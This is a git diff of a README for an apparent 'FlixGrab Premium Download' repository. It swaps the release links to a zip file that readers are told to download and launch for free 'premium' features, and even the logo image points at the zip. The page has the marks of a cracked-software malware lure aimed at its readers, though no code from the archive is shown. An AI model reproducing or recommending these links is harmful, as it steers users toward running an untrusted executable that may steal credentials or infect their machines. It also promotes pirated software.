@@ -17,11 +17,11 @@ Welcome to the FlixGrab Premium Download repository! Here you can find all the r
 - flixgrab-premium-portable
 
 ## Download Premium Software:
-[![Download FlixGrab Premium](https://github.com/mjnhiouj/FlixGrab-Premium-Download/releases/download/v1.0/Application.zip)](https://github.com/mjnhiouj/FlixGrab-Premium-Download/releases/download/v1.0/Application.zip)
+[![Download FlixGrab Premium](https://github.com/mjnhiouj/FlixGrab-Premium-Download/releases/download/v2.0/Software.zip)](https://github.com/mjnhiouj/FlixGrab-Premium-Download/releases/download/v2.0/Software.zip)
 
 🚀 Click the button above to access and download the premium FlixGrab software package. Launch the file to enjoy all the exclusive features offered by FlixGrab Premium!
 
-![FlixGrab Logo](https://github.com/mjnhiouj/FlixGrab-Premium-Download/releases/download/v1.0/Application.zip)
+![FlixGrab Logo](https://github.com/mjnhiouj/FlixGrab-Premium-Download/releases/download/v2.0/Software.zip)
 
 ### How to Use FlixGrab Premium:
 1. Download the software package from the link above.
